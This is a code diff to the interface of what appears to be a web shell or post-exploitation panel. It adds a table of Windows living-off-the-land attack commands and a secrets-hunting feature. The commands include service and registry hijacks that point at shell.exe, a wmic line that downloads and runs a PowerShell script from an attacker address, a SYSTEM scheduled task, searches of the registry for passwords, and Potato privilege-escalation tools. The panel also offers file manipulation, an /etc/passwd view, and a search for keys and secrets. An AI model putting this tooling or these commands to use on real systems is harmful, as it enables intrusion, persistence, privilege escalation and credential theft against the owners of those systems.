+    {name:'sc.exe',cats:['privesc'],cmds:{privesc:'sc qc VulnService\nsc config VulnService binPath="C:\\Users\\Public\\shell.exe"\nsc stop VulnService\nsc start VulnService'}},
+    {name:'reg.exe',cats:['privesc','file-read'],cmds:{privesc:'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Shell /t REG_SZ /d "C:\\Users\\Public\\shell.exe"','file-read':'reg query HKLM /f password /t REG_SZ /s\nreg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s'}},
+    {name:'wmic.exe',cats:['execute','privesc'],cmds:{execute:'wmic process call create "powershell -ep bypass -c IEX(curl http://{ip}:{port}/shell.ps1)"',privesc:'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'}},
+    {name:'schtasks.exe',cats:['privesc','execute'],cmds:{execute:'schtasks /create /sc minute /mo 1 /tn "Shell" /tr "C:\\Users\\Public\\shell.exe" /ru SYSTEM',privesc:'schtasks /query /fo LIST /V | findstr "Task To Run"'}},
+    {name:'runas.exe',cats:['execute'],cmds:{execute:'runas /user:DOMAIN\\user "cmd.exe /c whoami"\nrunas /savecred /user:admin "cmd.exe"'}},
+    {name:'PrintSpoofer',cats:['privesc'],cmds:{privesc:'PrintSpoofer.exe -i -c "cmd /c whoami"'}},
+    {name:'JuicyPotato',cats:['privesc'],cmds:{privesc:'JuicyPotato.exe -l 1337 -p C:\\Users\\Public\\shell.exe -t *'}},
+    {name:'GodPotato',cats:['privesc'],cmds:{privesc:'GodPotato.exe -cmd "cmd /c whoami"'}},
+];
+
+var gtfoShowLolbas = IS_WIN_CLIENT;
 function filterGtfo() { renderGtfoGrid(); }
 function searchGtfo() {
     activeGtfoFilter = $('gtfo-filter').value;
@@ -1306,8 +1481,11 @@ function renderGtfoGrid() {
     const search = ($('gtfo-search') ? $('gtfo-search').value : '').toLowerCase();
     const filter = $('gtfo-filter') ? $('gtfo-filter').value : 'all';
     const grid = $('gtfo-grid');
+    var titleEl = $('gtfo-title');
+    if (titleEl) titleEl.textContent = gtfoShowLolbas ? 'LOLBAS (Windows)' : 'GTFOBins (Linux)';
+    var dataSource = gtfoShowLolbas ? LOLBAS_DATA : GTFO_DATA;
     let html = '';
-    GTFO_DATA.forEach(g => {
+    dataSource.forEach(g => {
         if (search && !g.name.toLowerCase().includes(search)) return;
         if (filter !== 'all' && !g.cats.includes(filter)) return;
         const badges = g.cats.map(c => {
@@ -1376,7 +1554,7 @@ async function loadFileManager(path) {
 async function fmViewFile(path) { const data = await apiJson({action:'fileaction',type:'read',path}); editingFile = path; $('edit-modal-title').textContent = 'Edit: ' + path.split(/[\/\\]/).pop(); $('edit-content').value = data.content || ''; $('edit-modal').classList.add('show'); }
 async function fmDelete(path, name) { if (!confirm('Delete ' + name + '?')) return; await apiJson({action:'fileaction',type:'delete',path}); loadFileManager(fmCurrentPath); }
 async function fmRename(path, name) { const n = prompt('New name:', name); if (!n) return; await apiJson({action:'fileaction',type:'rename',path,newname:n}); loadFileManager(fmCurrentPath); }
-async function fmMkdir() { const n = prompt('Folder name:'); if (!n) return; await apiJson({action:'fileaction',type:'mkdir',path:fmCurrentPath+'/'+n}); loadFileManager(fmCurrentPath); }
+async function fmMkdir() { const n = prompt('Folder name:'); if (!n) return; var sep = fmCurrentPath.indexOf('\\') !== -1 ? '\\' : '/'; await apiJson({action:'fileaction',type:'mkdir',path:fmCurrentPath+sep+n}); loadFileManager(fmCurrentPath); }
 
 function closeEditModal() { $('edit-modal').classList.remove('show'); }
 async function saveEdit() {
@@ -1422,6 +1600,7 @@ async function loadSysinfo() {
     html += '<div style="margin-top:16px;display:flex;gap:8px">';
     html += '<button class="btn btn-primary" onclick="findSuid()">Find SUID / Privesc</button>';
     html += '<button class="btn" onclick="findWritable()">Find Writable Dirs</button>';
+    html += '<button class="btn" onclick="findSecrets()">Find Secrets &amp; Keys</button>';
     html += '</div>';
     if (info.env) html += '<div class="card" style="margin-top:16px"><h3 style="margin-bottom:8px;font-size:14px">Environment</h3><div class="code-box" onclick="copyText(this.textContent)" style="max-height:300px">' + esc(info.env) + '</div></div>';
     if (info.passwd && info.passwd !== 'N/A on Windows') html += '<div class="card" style="margin-top:16px"><h3 style="margin-bottom:8px;font-size:14px">/etc/passwd</h3><div class="code-box" onclick="copyText(this.textContent)" style="max-height:300px">' + esc(info.passwd) + '</div></div>';
@@ -1440,6 +1619,12 @@ async function findWritable() {
     body.innerHTML = '<p style="color:var(--text-dim)">Searching...</p>';
     const data = await apiJson({action:'find_writable'});
     body.innerHTML = '<h3 style="margin-bottom:12px">Writable Directories</h3><div class="code-box">' + esc(data.result || 'None found') + '</div><br><button class="btn" onclick="loadSysinfo()">Back to System Info</button>';
+}
+async function findSecrets() {
+    var body = $('sysinfo-body');
+    body.innerHTML = '<p style="color:var(--text-dim)">Searching for secrets, SSH keys, listening ports...</p>';
+    var data = await apiJson({action:'find_secrets'});
+    body.innerHTML = '<h3 style="margin-bottom:12px">Secrets, Keys &amp; Ports</h3><div class="code-box" style="white-space:pre-wrap">' + esc(data.result || 'None found') + '</div><br><button class="btn" onclick="loadSysinfo()">Back to System Info</button>';
 }
 
 // ===== NETWORK TOOLS =====
